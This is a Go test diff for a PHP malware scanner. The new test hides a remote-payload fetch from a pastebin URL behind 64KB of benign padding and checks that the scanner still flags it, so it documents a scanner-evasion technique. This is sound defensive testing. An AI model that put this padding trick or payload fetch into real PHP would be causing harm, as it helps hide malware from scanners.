@@ -112,6 +112,30 @@ func TestAnalyzePHPContentRemotePayload(t *testing.T) {
 	}
 }
 
+// An attacker can prepend benign PHP to push the malicious payload past the
+// content-read window. The scanner must still see the payload instead of
+// reading a fixed prefix and declaring the file clean.
+func TestAnalyzePHPContentDetectsPayloadPastReadWindow(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "padded.php")
+
+	var b strings.Builder
+	b.WriteString("<?php\n")
+	// ~64KB of benign assignments, well past the historical 32KB window.
+	for i := 0; b.Len() < 64*1024; i++ {
+		fmt.Fprintf(&b, "$var%d = %d;\n", i, i)
+	}
+	b.WriteString("$payload = file_get_contents('https://pastebin.com/raw/abc123');\n")
+	if err := os.WriteFile(path, []byte(b.String()), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	result := analyzePHPContent(path)
+	if result.check == "" {
+		t.Fatalf("payload after benign padding was missed (read window too small); got %+v", result)
+	}
+}
+
 func TestAnalyzePHPContentClean(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "clean.php")
